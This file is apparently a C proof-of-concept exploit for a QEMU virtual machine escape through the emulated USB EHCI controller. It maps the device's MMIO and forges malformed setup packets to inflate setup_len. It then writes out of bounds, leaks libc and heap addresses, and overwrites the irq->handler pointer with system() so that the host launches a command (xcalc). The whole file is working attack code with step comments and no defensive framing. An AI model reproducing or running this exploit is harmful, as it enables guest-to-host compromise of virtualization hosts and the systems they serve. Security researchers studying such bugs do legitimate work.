#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <netinet/in.h>
unsigned char *mmio_mem;
char *dmabuf;
struct ohci_hcca *hcca;
struct EHCIqtd *qtd;
struct ohci_ed *ed;
struct ohci_td *td;
char *setup_buf;
uint32_t *dmabuf32;
char *td_addr;
struct EHCIqh *qh;
struct ohci_td *td_1;
char *dmabuf_phys_addr;
typedef struct USBDevice USBDevice;
typedef struct USBEndpoint USBEndpoint;
long long data_buf;
long long irq;
long long text;
unsigned int *ptr;
struct USBEndpoint
{
    uint8_t nr;
    uint8_t pid;
    uint8_t type;
    uint8_t ifnum;
    int max_packet_size;
    int max_streams;
    bool pipeline;
    bool halted;
    USBDevice *dev;
    USBEndpoint *fd;
    USBEndpoint *bk;
};

struct USBDevice
{
    int32_t remote_wakeup;
    int32_t setup_state;
    int32_t setup_len;
    int32_t setup_index;

    USBEndpoint ep_ctl;
    USBEndpoint ep_in[15];
    USBEndpoint ep_out[15];
};

typedef struct EHCIqh
{
    uint32_t next; /* Standard next link pointer */

    /* endpoint characteristics */
    uint32_t epchar;

    /* endpoint capabilities */
    uint32_t epcap;

    uint32_t current_qtd; /* Standard next link pointer */
    uint32_t next_qtd;    /* Standard next link pointer */
    uint32_t altnext_qtd;

    uint32_t token;     /* Same as QTD token */
    uint32_t bufptr[5]; /* Standard buffer pointer */

} EHCIqh;
typedef struct EHCIqtd
{
    uint32_t next;    /* Standard next link pointer */
    uint32_t altnext; /* Standard next link pointer */
    uint32_t token;

    uint32_t bufptr[5]; /* Standard buffer pointer */

} EHCIqtd;
void die(const char *msg)
{
    perror(msg);
    exit(-1);
}
uint64_t virt2phys(void *p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        die("open");
    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8) != 8)
        die("read");
    // Assert page present

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000 + (virt & 0xfff);
    return phys;
}



void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint64_t mmio_read(uint32_t addr)
{
    return *((uint64_t *)(mmio_mem + addr));
}
void init()
{

    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    dmabuf = mmap(0, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (dmabuf == MAP_FAILED)
        die("mmap");
    mlock(dmabuf, 0x3000);
    dmabuf32 = dmabuf + 4;
    qtd = dmabuf + 0x200;
    qh = dmabuf + 0x100;
    setup_buf = dmabuf + 0x300;
    ptr = dmabuf;
}
void init_state()
{
    mmio_write(0x64, 0x100);
    mmio_write(0x64, 0x4);
    qh->epchar = 0x00;
    qh->token = 1 << 7;
    qh->current_qtd = virt2phys(dmabuf + 0x200);
    qtd = dmabuf + 0x200;
    qtd->token = 1 << 7 | 2 << 8 | 8 << 16;
    qtd->bufptr[0] = virt2phys(dmabuf + 0x300);
    setup_buf[6] = 0xff;
    setup_buf[7] = 0x0;
    dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2;
    mmio_write(0x28, 0x0);
    mmio_write(0x30, 0x0);
    mmio_write(0x2c,0);
    mmio_write(0x34, virt2phys(dmabuf));
    mmio_write(0x20, 0x11);
}
void set_length(uint16_t len, uint8_t in)
{
    mmio_write(0x64, 0x100);
    mmio_write(0x64, 0x4);
    setup_buf[0] = in;
    setup_buf[6] = len & 0xff;
    setup_buf[7] = (len >> 8) & 0xff;
    qh->epchar = 0x00;
    qh->token = 1 << 7;
    qh->current_qtd = virt2phys(dmabuf + 0x200);

    qtd->token = 1 << 7 | 2 << 8 | 8 << 16;  // 2 <<8 go to do_token_setup
    qtd->bufptr[0] = virt2phys(dmabuf + 0x300);
    dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2;
    mmio_write(0x28, 0x0);
    mmio_write(0x30, 0x0);
    mmio_write(0x2c,0);
    mmio_write(0x34, virt2phys(dmabuf));
    mmio_write(0x20, 0x11);
}
void set_length3(uint16_t len, uint8_t in)
{
    memset(dmabuf + 0x400, 0x61, 0x1000);
    mmio_write(0x64, 0x100);
    mmio_write(0x64, 0x4);
    setup_buf[0] = in;
    setup_buf[6] = len & 0xff;
    setup_buf[7] = (len >> 8) & 0xff;
    qh->epchar = 0x00;
    qh->token = 1 << 7;
    qh->current_qtd = virt2phys(dmabuf + 0x200);

    *(int *)&dmabuf[0x1304] = 0x2;
    *(int *)&dmabuf[0x1308] = 0x5000;
    *(int *)&dmabuf[0x130c] = 0xffffefe8;  //set s->setup_index -8
    qtd->token = 1 << 7 | 0 << 8 | 0x1010 << 16;  //write len is 0x1000, 0 << 8 got to write
    qtd->bufptr[0] = virt2phys(dmabuf + 0x300);
    qtd->bufptr[1] = virt2phys(dmabuf + 0x1300);
    dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2;
    mmio_write(0x28, 0x0);
    mmio_write(0x30, 0x0);
    mmio_write(0x2c,0);
    mmio_write(0x34, virt2phys(dmabuf));
    mmio_write(0x20, 0x11);
}
void set_length4(uint16_t len, uint8_t in)
{
    mmio_write(0x64, 0x100);
    mmio_write(0x64, 0x4);
    setup_buf[0] = in;
    setup_buf[6] = len & 0xff;
    setup_buf[7] = (len >> 8) & 0xff;
    qh->epchar = 0x00;
    qh->token = 1 << 7;
    qh->current_qtd = virt2phys(dmabuf + 0x200);
    *(int *)&dmabuf[0x1308] = 0x2;
    //*(int *)&dmabuf[0x130c] = 0x14f4-0x1018;

    *(ptr + 1221) = 0x16fc	-0x1018;
    *(ptr + 1221 - 2) = 2;
    qtd->token = 1 << 7 | 0 << 8 | 0x1018 << 16;
    qtd->bufptr[0] = virt2phys(dmabuf + 0x300);
    qtd->bufptr[1] = virt2phys(dmabuf + 0x1300);
    dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2;
    mmio_write(0x28, 0x0);
    mmio_write(0x30, 0x0);
    mmio_write(0x2c,0);
    mmio_write(0x34, virt2phys(dmabuf));
    mmio_write(0x20, 0x11);
}
void do_copy_read(uint16_t len, uint8_t in)
{
    mmio_write(0x64, 0x100);
    mmio_write(0x64, 0x4);
    qh->epchar = 0x00;
    qh->token = 1 << 7;
    qh->current_qtd = virt2phys(dmabuf + 0x200);
    qtd->token = 1 << 7 | 1 << 8 | 0x1100 << 16;
    qtd->bufptr[0] = virt2phys(dmabuf + 0x300);
    qtd->bufptr[1] = virt2phys(dmabuf + 0x1300);
    dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2;
    mmio_write(0x28, 0x0);
    mmio_write(0x30, 0x0);
    mmio_write(0x2c,0);
    mmio_write(0x34, virt2phys(dmabuf));
    mmio_write(0x20, 0x11);
}
void set_length6(uint16_t len, uint8_t in)
{
    memset(dmabuf + 0x400, 0x61, 0x1000);
    mmio_write(0x64, 0x100);
    mmio_write(0x64, 0x4);
    setup_buf[0] = in;
    setup_buf[6] = len & 0xff;
    setup_buf[7] = (len >> 8) & 0xff;
    qh->epchar = 0x00;
    qh->token = 1 << 7;
    qh->current_qtd = virt2phys(dmabuf + 0x200);

    *(int *)&dmabuf[0x1304] = 0x2;
    *(int *)&dmabuf[0x1308] = 0x5000;
    *(int *)&dmabuf[0x130c] = 0xffffe524;  //set s->setup_index -0xacc (point to irq->handler)
    qtd->token = 1 << 7 | 0 << 8 | 0x1010 << 16;  //write len is 0x1000, 0 << 8 got to write
    qtd->bufptr[0] = virt2phys(dmabuf + 0x300);
    qtd->bufptr[1] = virt2phys(dmabuf + 0x1300);
    dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2;
    mmio_write(0x28, 0x0);
    mmio_write(0x30, 0x0);
    mmio_write(0x2c,0);
    mmio_write(0x34, virt2phys(dmabuf));
    mmio_write(0x20, 0x11);
}
void final_write(uint16_t len, uint8_t in,long long system,long long irq_handler)
{
    mmio_write(0x64, 0x100);
    mmio_write(0x64, 0x4);
    setup_buf[0] = in;
    setup_buf[6] = len & 0xff;
    setup_buf[7] = (len >> 8) & 0xff;
    qh->epchar = 0x00;
    qh->token = 1 << 7;
    qh->current_qtd = virt2phys(dmabuf + 0x200);
    *(int *)&dmabuf[0x1308] = 0x2;

    unsigned long long *ptr2;
    ptr2 = &dmabuf[0x300];
    *(ptr2) = system;//system plt
    *(ptr2 + 1) = irq_handler + 0x10;
    *(ptr2 + 2) = 0x636c616378; //xcalc

    *(ptr + 1221) = 0x16fc - 0x1018;
    *(ptr + 1221 - 2) = 2;
    qtd->token = 1 << 7 | 0 << 8 | 0x18 << 16;
    qtd->bufptr[0] = virt2phys(dmabuf + 0x300);
    qtd->bufptr[1] = virt2phys(dmabuf + 0x1300);
    dmabuf32[0] = virt2phys(dmabuf + 0x100) + 0x2;
    mmio_write(0x28, 0x0);
    mmio_write(0x30, 0x0);
    mmio_write(0x2c,0);
    mmio_write(0x34, virt2phys(dmabuf));
    mmio_write(0x20, 0x11);
}

void check()
{
    while (mmio_read(0x20) != 0x100400080000)
    {
        printf("error:%p ", mmio_read(0x20));
        usleep(100000);
    }
}

int main()
{
    setbuf(stdout, 0);

    init();
    puts("Start!");
    //---------------------- First Step : leak data_buf addr
    //send a normal packet,set s->setup_state to SETUP_DATA_STATE(2)
    puts("set s->setup_state:SETUP_DATA_STATE");
    init_state();
    //getchar();
    check();
    //send a deformity,set s->setup_len to 0x5000
    
    puts("set s->setup_len:0x5000");
    set_length(0x5000, 0);
    //getchar();
    usleep(500000);
    
    //write out of bounds
    puts("write out of bounds,set setup_index -8");
    set_length3(0x5000, 0x80);
    //getchar();
    check();
    //write out of bounds,set s->setup_buf for leak address
    puts("write out of bounds,set s->setup_buf and s->setup_index");
    set_length4(0x5000, 0x80);
    //getchar();
    check();
    //now leak address
    //read text address
    puts("read text address");
    do_copy_read(0x5000,0x80);
    //getchar();
    check();

    long long *ptrr = dmabuf + 0x300;
    long long libc_base = *ptrr - 0x51a92b;
    long long *heap = dmabuf + 0x308;
    long long system = libc_base + 0x2038d0;
    long long irq_handler = *heap - 0x2e88;
    long long irq_opaque = *heap - 0x2e80;
    printf("libc_base: %p\n",libc_base);
    printf("system: %p\n",system);
    printf("irq_handler: %p\n",irq_handler);
    printf("irq_opaque: %p\n",irq_opaque);
    //irq->handler: 0x5555592bb138
    //irq->opaque: 0x5555592bb140

    //restart
    init_state();
    check();
    set_length(0x5000, 0);
    usleep(500000);

    //write irq->handler
    puts("change s->setup_index point to irq->handler");
    set_length6(0x5000,0x80);
    //getchar();
    check();

    puts("change irq->handler");
    final_write(0x5000,0x80,system,irq_handler);
    //getchar();
    check();
    puts("pwn it?");

    return 0;
}
